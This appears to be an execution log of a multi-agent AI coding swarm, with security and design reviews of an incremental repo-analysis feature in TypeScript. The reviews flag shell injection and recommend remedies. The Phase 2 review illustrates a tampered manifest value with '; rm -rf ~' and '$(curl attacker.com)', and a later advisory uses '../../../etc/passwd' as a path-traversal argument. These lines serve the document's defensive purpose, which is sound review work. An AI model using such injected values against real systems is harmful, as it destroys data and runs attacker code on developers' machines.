# Swarm Execution Log — intelligence_incremental_20260724

**Track:** Incremental Intelligence Layer — Always-Current, Basically-Free Repo Awareness
**Mode:** `pipeline` (sliding window assembly-line)
**Branch:** `track/intelligence_incremental_20260724`
**Oracle Cadence:** every 2 phases
**Started:** 2026-07-24T03:11:00Z

## Timeline

### [Review Phase 1] Advisory Review — 2026-07-24T03:18Z
**Reviewer:** Swarm Reviewer (pipeline advisory)
**Commit:** `cf9750e`
**Severity Summary:** 🔴 CRITICAL: 2 | 🟡 ADVISORY: 3

---

#### 🔴 CRITICAL-1 — Shell String Interpolation of Filenames in `symbol-extraction.ts`

**File:** `packages/superconductor-core/src/intelligence/runners/symbol-extraction.ts`

```typescript
targets = scopedFiles.filter(f => fs.existsSync(path.join(projectRoot, f)))
  .map(f => JSON.stringify(path.join(projectRoot, f)))
  .join(' ');

// ...then used as:
`ctags ... ${targets}`
```

`JSON.stringify` on a path produces a **quoted string** (`"path"` including the double-quotes), but those are just characters interpolated into a shell string. A filename containing `$(...)`, backticks, semicolons, or space-separated arguments can break out of the intended target boundary. This is a shell injection risk. The `lizard` runner in `complexity.ts` correctly calls `execSync` per file with `JSON.stringify(fullPath)` in isolation (each file gets its own `execSync` invocation) — `symbol-extraction.ts` must do the same, or switch to `spawnSync` with an args array.

**Impact:** Attacker-controlled filenames in a repo can achieve arbitrary code execution on the developer's machine.

---

#### 🔴 CRITICAL-2 — `dependency-graph.ts` injects un-sanitised scoped filenames into shell string (depcruise target)

**File:** `packages/superconductor-core/src/intelligence/runners/dependency-graph.ts`

```typescript
target = scopedFiles
  .filter(f => fs.existsSync(path.join(projectRoot, f)))
  .map(f => JSON.stringify(f))   // ← relative path, not absolute; still shell-interpolated
  .join(' ');

// ...then used as:
const out = execSync(`... depcruise ${target} ...`);
```

Same class of injection as CRITICAL-1. `JSON.stringify` adds literal quote characters but the result is still interpolated into a shell string. Any filename with shell metacharacters (`;`, `$()`, `&&`, etc.) breaks the boundary. Use `spawnSync` with an args array, or individually exec with validated absolute paths checked against a `projectRoot.startsWith` guard.

**Additional sub-issue:** `JSON.stringify(f)` uses the **relative** path `f` (not `path.join(projectRoot, f)`), so the path traversal guard (existsSync on absolute) is effective but the executed command uses relative paths, which may resolve differently depending on cwd.

---

#### 🟡 ADVISORY-1 — `semgrep` scoped mode uses `--include` pattern, not file targeting

**File:** `packages/superconductor-core/src/intelligence/runners/sast.ts`

```typescript
targetArgs = scopedFiles.map(f => `--include ${JSON.stringify(f)}`).join(' ') + ' ' + targetArgs;
// results in: semgrep scan --include "src/foo.ts" <projectRoot> --config=auto --json
```

`semgrep --include` is a **glob filter** on the full project scan, not direct file targeting. This means semgrep still walks the entire `projectRoot` tree — it just filters results. For large repos, the incremental performance benefit is negated. The correct approach for file-level targeting is to pass the file paths as positional arguments to `semgrep scan` directly (semgrep accepts paths as positional args). Also, `JSON.stringify(f)` here again injects into a shell string.

---

#### 🟡 ADVISORY-2 — Missing `entries` key on some non-scoped degraded return paths (type inconsistency)

**Files:** `dependency-graph.ts`, `symbol-extraction.ts`, `sast.ts`, `complexity.ts`

Non-scoped (full-scan) degraded paths return `{ status: 'degraded' }` (no `entries` key), while scoped degraded paths return `{ status: 'degraded', entries: null | [] }`. Callers that key off `result.entries` in a unified codepath will get `undefined` vs `null` inconsistency. No explicit return-type annotation (`RunnerResult` interface) enforces the contract, making this a latent bug for Phase 2 callers.

---

#### 🟡 ADVISORY-3 — `complexity.ts` scoped mode reads existing `outFile` from disk (mutable shared state)

**File:** `packages/superconductor-core/src/intelligence/runners/complexity.ts`

```typescript
if (fs.existsSync(outFile)) {
  const data = JSON.parse(fs.readFileSync(outFile, 'utf8'));
  // reads pre-existing churn data to merge with scoped results
}
```

The scoped path **reads** from the full-scan output file to back-fill existing churn data, creating a hidden coupling: scoped mode produces different results depending on whether a prior full-scan output file exists. This breaks idempotency and makes scoped results unpredictable in a clean CI environment. The churn merge logic should either receive prior state as a parameter (from caller), or the runner should document this statefulness explicitly.

---

#### ✅ Checks Passed

- All 6 runners accept `scopedFiles?: string[]` as final param ✓
- Scoped mode returns `{ status, entries }` and does not write to disk (confirmed for all 6) ✓
- `undefined` / empty `[]` scopedFiles → existing full-scan path unchanged ✓
- Non-existent scoped files are filtered with `fs.existsSync` (no throws) — confirmed for all 6 ✓
- Test file `scoped-runners.test.ts` covers backward compat (`undefined`, `[]`) and graceful degradation (nonexistent file) ✓
- `test-gaps.ts` regex bug fix (`\\s` → `\s`) is a correct improvement, unrelated to scope

---

#### Verdict

**PAUSE PHASE 2.** Two CRITICAL shell-injection issues (`symbol-extraction.ts` and `dependency-graph.ts`) must be fixed before merging. Both must switch to per-file `spawnSync` with args arrays, or individually-wrapped `execSync` calls using only verified absolute paths — never string-interpolated into the shell command.

### [Phase 2] Incremental Updater Core
**Status:** Completed
**Commit:** `ea0deee`
**Test Count:** 141 tests passing

**Advisory Notes for Phase 3:**
- The `RunnerResult` interface is now in `runners/types.ts` — Phase 3's CLI wrapper must import it when calling `update()`
- `00_manifest.json` gains `lastCommitSha` and `incrementalRuns` fields — the CLI wrapper should surface `UpdateReport` to stderr
- `mergeIntoJson` uses atomic rename — Phase 3 integration tests should verify the `.tmp` file is cleaned up on success

---

### [Oracle Cadence Check] Phases 1-2
**Auditor:** Oracle Agent (cadence audit)
**Timestamp:** 2026-07-24T03:27:00Z
**Commits audited:** `cf9750e` (Phase 1 scoped runners), `5d7c09d` (Phase 1 remediation), `ea0deee` (Phase 2 incremental updater)
**Change volume:** 21 files · +624 / -74 lines

---

#### Dimension Scores

| Dimension | Score | Notes |
|-----------|-------|-------|
| Plan Adherence | 9/10 | All Phase 1 & 2 spec tasks delivered: 6 runners gained `scopedFiles?`, `mergeIntoJson` implemented with atomic write, `update()` with `PHASE_INVALIDATION` map, `UpdateReport`, manifest tracking. Minor gap: `mergeIntoJson` sort-by-`hotspot_score` is applied only when all entries have that field; plan says "sort by hotspot_score desc" unconditionally, but non-complexity runners don't carry the field — acceptable pragmatic deviation. |
| DRY Principles | 7/10 | No gross duplication across the 6 runners. However, each runner independently re-implements the `scopedFiles && scopedFiles.length > 0` branch guard (~8–12 lines each). A shared `validateScopedFiles(projectRoot, scopedFiles)` helper would eliminate this repetition. The `update()` function also has a three-way repeated `runPipeline([], ...)` early-exit pattern (no-manifest, parse-error, stale-threshold) that could be unified into a single guard. |
| Architecture Quality | 7/10 | `IncrementalIntelligenceUpdater.update()` correctly imports and calls the 6 scoped runners directly — it does **not** delegate through `pipeline.ts` for incremental work. However, it imports `runPipeline` from `pipeline.ts` and calls it as a fallback for full-scan scenarios (no manifest, parse error, stale threshold). This is the correct design intent (fallback to full-scan), but the coupling is implicit — a caller cannot inject a mock pipeline for testing without patching the module. The test suite correctly mocks this via `vi.mock('../../src/intelligence/pipeline')`, which works but is fragile. An explicit `fullScanFn` injection parameter would be cleaner. |
| Security Posture | 8/10 | Both CRITICAL shell injections from Phase 1 review are **fully remediated**: `symbol-extraction.ts` now uses per-file `spawnSync` with args arrays and an `absPath.startsWith(resolve(projectRoot))` traversal guard. `dependency-graph.ts` now uses `spawnSync` with args arrays and validates absolute paths before use. `sast.ts`'s semgrep scoped path uses `spawnSync` with args arrays correctly. **Residual:** `trivy` in `sast.ts` (lines 130–131 and 146–148) still uses `execSync` with `JSON.stringify(fullPath)` and `JSON.stringify(projectRoot)` interpolated into a shell template string. `trivy` runs on the full `projectRoot` (not user-controlled filenames per-file), so the risk surface is lower, but `projectRoot` itself is not validated for shell metacharacters. This is a low-severity residual, not critical, since `projectRoot` is set at process startup — but consistency with the `spawnSync` pattern would eliminate it entirely. The `lizard` runner in `complexity.ts` retains `execSync` with `JSON.stringify(fullPath)` per-file — same low-severity residual as trivy (no user-controlled shell expansion since it's per pre-validated file). |
| Test Quality | 8/10 | Tests for `mergeIntoJson` are concrete and test actual file I/O (not mocked), covering merge semantics, malformed input, and atomic write. The `PHASE_INVALIDATION` tests are exhaustive over file extension variants. The `update()` tests correctly assert runner invocation counts and `phasesRun` contents. Weak spot: the `update()` tests mock all runners with `vi.fn(() => ({ status: 'ok', entries: [] }))`, which means the full incremental round-trip (runner → `mergeIntoJson` → on-disk mutation) is never tested end-to-end. An integration test asserting the actual on-disk JSON content after `update()` would close this gap. |

---

#### **Overall Score: 7.8 / 10**

**Rationale:** Phases 1 and 2 deliver a coherent, working incremental intelligence architecture with the two CRITICAL shell injections properly remediated using `spawnSync` with args arrays. Plan adherence is high — every spec task shipped. The primary systemic weakness is **incomplete adoption of the `spawnSync` pattern**: `trivy` and `lizard` still use shell-string `execSync`, creating an inconsistency that will confuse future contributors and leaves a low-severity residual. DRY debt around the repeated `scopedFiles` guard blocks and the triple early-exit `runPipeline` fallback should be addressed before Phase 3 adds more callers. Test coverage is strong on unit behaviour but lacks an end-to-end integration path.

---

#### Verdict
**✅ PROCEED to Phase 3.** The foundation is sound — scoped runners are correct, the updater is properly decoupled from the pipeline for incremental work, and the critical security remediations are in place.

---

#### Systemic Patterns — Phase 3+ Processors MUST Be Aware Of

1. **Residual `execSync` shell interpolation in `trivy` and `lizard`:** Low severity but inconsistent with the remediated runners. Phase 3's CLI wrapper should not add new `execSync`+string-interpolation patterns. All new subprocess calls must use `spawnSync` with args arrays.

2. **`trivy` in `runTrivyScan` is NOT scoped per-file at the scoped path (lines 127–135):** It iterates `scopedFiles` and calls `trivy fs <fullPath>` per file, but Trivy's `fs` subcommand scans a directory — running it on a single `.ts` file will either error or produce no findings. Phase 3 integration tests should validate that trivy scoped behaviour produces expected output, or the per-file trivy path should be skipped (trivy is dependency-level, not file-level).

3. **`update()` fallback to `runPipeline` is synchronous:** `update()` is declared `async` but the `runPipeline` fallback calls are synchronous (blocking). Phase 3's CLI wrapper must handle this correctly — if `runPipeline` is long-running, it will block the event loop. The wrapper should spawn it in a worker or child process.

4. **`mergeIntoJson` does not handle non-array top-level JSON (e.g., object from `dependency-graph`):** `dependency-graph` returns `{ nodes, edges, circularDeps }` — not an array. If Phase 3 attempts to merge dependency-graph entries via `mergeIntoJson`, it will hit the `if (!Array.isArray(existing)) { existing = [] }` guard and silently discard the existing graph. Phase 3 must use a dedicated merge strategy for non-array outputs.

5. **`complexity.ts` statefulness is documented but not guarded:** The comment added in `5d7c09d` documents the statefulness, but there is no runtime guard confirming a prior full scan has run. The `update()` function guards via the manifest check — Phase 3 must not call scoped runners directly without ensuring the manifest exists.

---

### [Review Phase 2] Advisory Review — 2026-07-24T03:27Z
**Reviewer:** Swarm Reviewer (pipeline advisory)
**Commit:** `ea0deee`
**Severity Summary:** 🔴 CRITICAL: 1 | 🟡 ADVISORY: 4

---

#### Spec Compliance Checklist

| Check | Result | Notes |
|---|---|---|
| `mergeIntoJson` uses atomic write (tmp + rename) | ✅ PASS | `${outputFile}.tmp.${Date.now()}` → `fs.renameSync` |
| Missing manifest → triggers full scan | ✅ PASS | Both `!existsSync` and `JSON.parse` catch paths call `runPipeline` |
| Phase invalidation map correct (`.ts` → 6 phases) | ✅ PASS | complexity, dep-graph, sast, symbol-extraction, test-gaps, package-surface all fire |
| Phase invalidation map correct (`package.json` → 2 phases) | ✅ PASS | fingerprint + dependency-graph only |
| Phase invalidation map correct (`.test.ts` → test-gaps only) | ✅ PASS | `complexity` excludes `.test.` / `.spec.` files |
| `incrementalRuns >= 50` → full rescan + counter reset | ⚠️ PARTIAL | Counter is reset to `0` **before** `runPipeline`, but the manifest reset is never persisted to disk in the full-rescan branch — only the incremental branch writes the manifest. Counter resets in memory only. |
| Coupling updated via `git log ${lastSha}..HEAD` | ✅ PASS | Present; errors are silently swallowed (see ADVISORY-1) |
| `00_manifest.json` updated with `lastCommitSha` + `incrementalRuns` | ⚠️ PARTIAL | Only updated in the **incremental** path. Full-rescan paths (missing manifest, parse error, >= 50 runs) return early without writing an updated manifest. |
| `UpdateReport` returned with all fields | ✅ PASS | `phasesRun`, `filesUpdated`, `durationMs`, `snapshotSha` all present in all return paths |

---

#### 🔴 CRITICAL-1 — Shell String Interpolation of `lastSha` in `git log` exec call

**File:** `packages/superconductor-core/src/intelligence/incremental-updater.ts`

```typescript
const lastSha = manifest.lastCommitSha || 'HEAD~1';
// ...
newCommits = execSync(`git log ${lastSha}..HEAD --name-only --format=format:`, { cwd: projectRoot, encoding: 'utf-8' });
```

`lastSha` is read directly from `00_manifest.json` on disk (a file that persists between runs and could be user-edited or tampered with) and is **string-interpolated into a shell command** passed to `execSync`. A malicious or corrupted value in `manifest.lastCommitSha` such as `; rm -rf ~` or `$(curl attacker.com)` achieves arbitrary shell execution. Phase 1 CRITICAL-1 and CRITICAL-2 flagged the identical pattern in runners and required `spawnSync` with an args array.

**Fix required:** Use `spawnSync('git', ['log', `${lastSha}..HEAD`, '--name-only', '--format=format:'], { cwd: projectRoot })` — never interpolate `lastSha` into a shell string. Additionally, validate `lastSha` with a SHA1 hex regex (`/^[0-9a-f]{40}$/`) before use; reject and fallback to `'HEAD~1'` if invalid.

**Impact:** If `00_manifest.json` is ever written with attacker-controlled content (e.g. via a compromised upstream snapshot, a malicious package that writes to the output dir, or a developer accidentally committing one), the next incremental update executes arbitrary shell code on the developer's machine.

---

#### 🟡 ADVISORY-1 — Coupling `git log` failure silently swallowed; error undetectable by caller

**File:** `packages/superconductor-core/src/intelligence/incremental-updater.ts`

```typescript
try {
  newCommits = execSync(`git log ${lastSha}..HEAD ...`);
} catch(e) {}
```

The inner `try/catch` with an empty catch block means any git failure (no prior commits, detached HEAD, invalid SHA, git not installed) produces an empty `newCommits` silently — `phasesRun` still includes `'coupling'` but no entries are merged. The caller sees `coupling` as "done" when it actually produced no data. This misleads monitoring/observability.

**Fix:** At minimum log the error to stderr. Better: set `newCommits = ''` but add a `warnings` array to `UpdateReport` so the caller can surface degraded phases.

---

#### 🟡 ADVISORY-2 — `incrementalRuns` counter reset not persisted in full-rescan branch

**File:** `packages/superconductor-core/src/intelligence/incremental-updater.ts`

```typescript
if (manifest.incrementalRuns >= 50) {
  manifest.incrementalRuns = 0;           // ← in-memory only
  runPipeline([], projectRoot, options.outputDir);
  return { phasesRun: ['full-scan'], ... };
  // ← manifest never written back to disk
}
```

The counter is reset to `0` in memory but the function returns early before writing the manifest. On the *next* call, `manifest.incrementalRuns` is still `50` from disk — triggering another full rescan immediately, every single run forever. The >= 50 branch effectively fires on every subsequent call once the threshold is reached.

**Fix:** Write the manifest to disk before returning in the full-rescan branch, same as the incremental path does.

---

#### 🟡 ADVISORY-3 — `update()` is `async` but `runPipeline` is called without `await`

**File:** `packages/superconductor-core/src/intelligence/incremental-updater.ts`

```typescript
export async function update(...): Promise<UpdateReport> {
  // ...
  runPipeline([], projectRoot, options.outputDir);   // ← no await
  return { ... durationMs: Date.now() - start ... };
}
```

`runPipeline` is called synchronously (no `await`). If `runPipeline` is — or becomes — async, this silently becomes a fire-and-forget that returns before the pipeline completes. `durationMs` would measure near-zero latency. The `UpdateReport` would be returned before the scan finishes, making it unreliable. Even if `runPipeline` is currently synchronous, the function signature promises async semantics and callers may `await` the result expecting completion.

**Fix:** Confirm whether `runPipeline` is synchronous or async, and either `await` it or annotate clearly that the full-scan branch returns immediately while the pipeline runs in the background (in which case `durationMs` should not be reported as the pipeline duration).

---

#### 🟡 ADVISORY-4 — `update()` does not handle `entries: null` / `undefined` from degraded runners

**File:** `packages/superconductor-core/src/intelligence/incremental-updater.ts`

```typescript
const res = runComplexity(..., changedFiles);
if (res.entries) mergeIntoJson(..., res.entries);
```

The `if (res.entries)` guard correctly skips `null`/`undefined`/empty, but Phase 1 ADVISORY-2 noted that non-scoped degraded paths return `{ status: 'degraded' }` with no `entries` key at all (i.e. `undefined`). For degraded runners the phase is silently skipped with no indication in `phasesRun` or `UpdateReport`. A degraded run looks identical to a "no matching files" skip from the caller's perspective.

**Fix:** Distinguish between "no-op (no files matched the invalidation predicate)" and "degraded (runner failed)". Add a `degradedPhases?: string[]` field to `UpdateReport`, or log the degradation to stderr.

---

#### ✅ Checks Passed

- `mergeIntoJson` atomic write: `writeFileSync` to `.tmp.${Date.now()}` then `renameSync` ✓
- Missing manifest → `runPipeline` + early return ✓
- Malformed manifest JSON → `runPipeline` + early return ✓
- `incrementalRuns >= 50` check uses `>=` (not `>`) per spec ✓
- Coupling uses `git log ${lastSha}..HEAD --name-only` ✓
- `00_manifest.json` gets `lastCommitSha` (from `git rev-parse HEAD`) + `incrementalRuns` increment ✓
- `UpdateReport` contains all 4 spec fields in all return paths ✓
- `mergeIntoJson` normalizes paths with `path.normalize` before dedup ✓
- `mergeIntoJson` sorts by `hotspot_score` descending (where key exists) ✓
- `PHASE_INVALIDATION` map tested in test file for `.ts`, `.test.ts`, `package.json` ✓
- Test coverage: missing manifest, `incrementalRuns=50`, single changed file, `mergeIntoJson` merge/dedup, atomic write ✓
- Phase runners called with `changedFiles` as `scopedFiles` parameter ✓
- No shell interpolation of `changedFiles` entries (files not used in any exec call directly) ✓

---

#### Verdict

**CONDITIONAL PROCEED.** One CRITICAL issue must be fixed before merging to main:

- 🔴 **CRITICAL-1**: `lastSha` from `manifest.lastCommitSha` is shell-interpolated into `execSync`. Switch to `spawnSync` with an args array and validate the SHA format before use.

The 3 advisories (ADVISORY-2 counter persistence, ADVISORY-3 sync/async ambiguity, ADVISORY-4 degraded-phase observability) are low-severity enough to defer to Phase 3, but ADVISORY-2 will cause a correctness regression (infinite full-rescans) if not addressed soon.

---

### [Phase 3] Git Hook & CLI Wrapper
**Status:** Completed
**Commit:** e21b1ba
**Test Count:** 142 tests passing

**Advisory Notes for Phase 4:**
- `cli-update.ts` handles the post-commit fallback cleanly but doesn't solve the ADVISORY-2 full-rescan loop inside `update()`. The `manifest.incrementalRuns = 0;` reset must be synced to disk.
- Phase 4 should fix the `lastSha` shell injection identified in Phase 2 Review.
- We modified `incremental-updater.ts` to no longer pass scoped arguments to `runPackageSurface` or expect a returned entries property from `runFingerprint`, as both do not operate per-file incrementally in the existing architecture.
- `package-surface.ts` was returning an object for `entries`, which broke the `RunnerResult` typing; this was fixed to map object entries.
- ORACLE ADVISORY: `mergeIntoJson` assumes all outputs are `{ file: string }[]` arrays, but `dependency-graph` outputs `{ nodes, edges, circularDeps }`. Phase 4 should introduce a dedicated merge strategy for non-array outputs.
- ORACLE ADVISORY: Do not introduce any new `execSync` + string interpolation patterns. Use `spawnSync`.
- ORACLE ADVISORY: `trivy fs <file.ts>` is semantically incorrect (it scans directories). Scoped trivial scanning should be skipped or stubbed instead of asserting findings.

### [Remediation] Phase 2 Critical Fix
**Status:** Completed
**Commit:** 27c5ff3
**Test Count:** 142 tests passing

---

### [Review Phase 3] Advisory Review
**Auditor:** Swarm Reviewer (pipeline assembly-line)
**Timestamp:** 2026-07-24T03:35:00Z
**Commit reviewed:** `6ebebad` — `feat(intelligence): add cli-update wrapper, git post-commit hook, and setup integration`

---

#### Checklist Results

| Item | Status | Notes |
|------|--------|-------|
| `cli-update.ts` outputs `UpdateReport` to **stderr** | ✅ PASS | `process.stderr.write(...)` on both success and error paths |
| `cli-update.ts` uses `execFileSync` (not `execSync` + string) for `git rev-parse` | ✅ PASS | `execFileSync('git', ['rev-parse', '--show-toplevel'], ...)` — args array, no interpolation |
| `cli-update.ts` exits 0 on all error paths | ✅ PASS | `.catch(e => { …; process.exit(0); })` — explicit comment explains rationale |
| `cli-update.ts` no stdout writes | ✅ PASS | No `console.log`, no `process.stdout.write` found |
| `install-git-hook.sh` idempotency marker check | ✅ PASS | `grep -q "$MARKER"` guard present before any write |
| `install-git-hook.sh` runs hook in background (`&`) | ✅ PASS | `node … $CHANGED &` in injected block |
| `install-git-hook.sh` appends to existing hook (no overwrite) | ✅ PASS | `cat >> "$HOOK_FILE"` — append redirect, not `>` |
| `setup/SKILL.md §2.7` has hook install step | ✅ PASS | Step `2a` added |
| `setup/SKILL.md §2.7` has baseline scan step | ✅ PASS | Step `2b` added |
| Integration test: modified file entries change | ⚠️ PARTIAL | Tests `filesUpdated` count but does **not** assert that the on-disk JSON entry for `file1.ts` was actually updated with new data |
| Integration test: `lastCommitSha` updates | ✅ PASS | `expect(manifest.lastCommitSha).toBe(newSha)` |
| Integration test: no `.tmp` files left | ✅ PASS | `tmpFiles.length === 0` assertion present |

---

#### Findings

##### 🔴 CRITICAL — None

No CRITICAL issues found in this commit.

---

##### 🟡 ADVISORY-1 — `$CHANGED` unquoted in hook invocation (word-splitting)

**File:** `scripts/install-git-hook.sh`, line 19 (injected into hook)
```sh
node "$(git rev-parse --show-toplevel)/packages/superconductor-core/dist/intelligence/cli-update.js" $CHANGED &
```

`$CHANGED` is **unquoted** in the `node` invocation. When filenames contain spaces (e.g., `"my component.ts"`), the shell will word-split across the space, producing two separate argv values and corrupting the file path passed to `cli-update.js`. This is a known footgun in bash scripts.

**Fix:** Use `mapfile` / `read -a` or quote the expansion:
```sh
# Option A: pass via xargs / array
CHANGED_ARRAY=()
while IFS= read -r line; do
  [[ -n "$line" ]] && CHANGED_ARRAY+=("$line")
done <<< "$CHANGED"
node "$(git rev-parse --show-toplevel)/packages/superconductor-core/dist/intelligence/cli-update.js" "${CHANGED_ARRAY[@]}" &
```

**Severity:** Advisory — only triggers on repos with space-containing filenames, but this is a real possibility for any JS project with component libraries (e.g., `"Button (v2).tsx"`).

---

##### 🟡 ADVISORY-2 — `cli-update.ts` does not validate `changedFiles` are within `projectRoot`

**File:** `packages/superconductor-core/src/intelligence/cli-update.ts`, lines 14–21

`changedFiles` is taken directly from `process.argv.slice(2)` and passed to `update()` without checking that each path resolves to a location within `projectRoot`. While the hook injects only git-tracked filenames, a manually invoked `cli-update.js ../../../etc/passwd` (or a compromised hook) could trigger runner logic on files outside the project boundary.

**Fix:** Add a validation step in `main()`:
```ts
const resolvedRoot = path.resolve(projectRoot);
const safeFiles = changedFiles.filter(f => {
  const abs = path.resolve(resolvedRoot, f);
  return abs.startsWith(resolvedRoot + path.sep);
});
```

**Severity:** Advisory — not exploitable through the normal hook flow, but a defence-in-depth gap.

---

##### 🟡 ADVISORY-3 — `incremental-updater.ts` still uses `execSync` for `git rev-parse HEAD`

**File:** `packages/superconductor-core/src/intelligence/incremental-updater.ts`, line 75
```ts
headSha = execSync('git rev-parse HEAD', { cwd: projectRoot, encoding: 'utf-8' }).trim();
```

This was flagged as a residual in the Phase 1-2 Oracle review. The `cwd: projectRoot` mitigates the most obvious attack surface (the command string itself is fixed), but the pattern is inconsistent with the `spawnSync` approach adopted by `cli-update.ts` and the remediated runners. It is not a new regression introduced in this commit, but it was not addressed during Phase 3 either.

**Fix:** Replace with `spawnSync`:
```ts
const result = spawnSync('git', ['rev-parse', 'HEAD'], { cwd: projectRoot, encoding: 'utf-8' });
headSha = (result.stdout || '').trim();
```

**Severity:** Advisory — `projectRoot` is set at process startup and is not user-controlled per-call, but pattern inconsistency creates maintenance risk.

---

##### 🟡 ADVISORY-4 — Integration test does not verify on-disk content mutation for `file1.ts`

**File:** `packages/superconductor-core/tests/intelligence/git-hook-integration.test.ts`, lines 55–75

The test asserts `report.filesUpdated === 1`, `manifest.lastCommitSha === newSha`, and no `.tmp` files — all correct. However, it does **not** assert that the content of `03_complexity.json` (or any runner output file) was actually mutated with new entries for `file1.ts`. The runner mocks are spied via `ToolRegistry` but the runners themselves are not mocked — this means the actual runner code runs, which is good. But without asserting the final JSON content, a silent "runner ran but wrote nothing" regression would pass undetected.

**Fix:** Add assertion after `update()`:
```ts
const complexity = JSON.parse(fs.readFileSync(path.join(outputDir, '03_complexity.json'), 'utf-8'));
const file1Entry = complexity.find((e: any) => e.file === 'file1.ts');
expect(file1Entry).toBeDefined(); // runner must have updated the entry
```

**Severity:** Advisory — the `.tmp` cleanup is verified (good), but the round-trip data mutation is not.

---

##### 🟡 ADVISORY-5 — `fingerprint` and `package-surface` runners silently dropped scoped-files support

**File:** `packages/superconductor-core/src/intelligence/incremental-updater.ts`, diff in this commit

This commit removed the scoped-file merge for `fingerprint` (lines 113–114) and `package-surface` (lines 155–156):

```diff
-    const res = runFingerprint(projectRoot, outputDir, registry.capabilities.fingerprint, changedFiles);
-    if (res.entries) mergeIntoJson(path.join(outputDir, '01_fingerprint.json'), res.entries);
+    runFingerprint(projectRoot, outputDir, registry.capabilities.fingerprint);
```

```diff
-    const res = runPackageSurface(projectRoot, outputDir, changedFiles);
-    if (res.entries) mergeIntoJson(path.join(outputDir, '08_package_surface.json'), res.entries);
+    runPackageSurface(projectRoot, outputDir);
```

This is a **semantic regression**: the scoped-files incremental merge (the core Phase 2 value proposition) was intentionally removed for these two runners. The runners now do a full re-scan and overwrite their output files directly, rather than calling `mergeIntoJson`. Phase 3 may have a legitimate reason (e.g., `fingerprint` and `package-surface` do not support per-file scoping), but:

1. The commit message does not document this intentional drop.
2. The integration test does not cover these two runners, so the regression is not caught by CI.
3. If unintentional, this is a correctness bug: changed files in the fingerprint/package-surface domains will trigger a full re-scan instead of a targeted merge, defeating the "basically-free" goal of the track.

**Action required:** The coder agent should confirm whether `fingerprint` and `package-surface` intentionally do not support `mergeIntoJson` (e.g., because their output format is not an array of `{ file: string }` objects). If intentional, document it in a comment. If unintentional, restore the merge calls.

**Severity:** Advisory — this is a functional correctness question, not a security issue. However, it directly impacts the spec's core incremental update goal and warrants explicit confirmation.

---

#### Severity Summary

| Severity | Count |
|----------|-------|
| 🔴 CRITICAL | 0 |
| 🟠 HIGH | 0 |
| 🟡 ADVISORY | 5 |
| ✅ PASS (spec checks) | 9/12 |

**Verdict:** Phase 3 is **clear to proceed** from a correctness and security standpoint. No CRITICAL blockers. The five advisories should be triaged before phase close:
- **ADV-1** (unquoted `$CHANGED`) and **ADV-5** (silent scoped-merge removal) are the most important to resolve.
- **ADV-2**, **ADV-3**, and **ADV-4** can be batched into a single remediation commit.

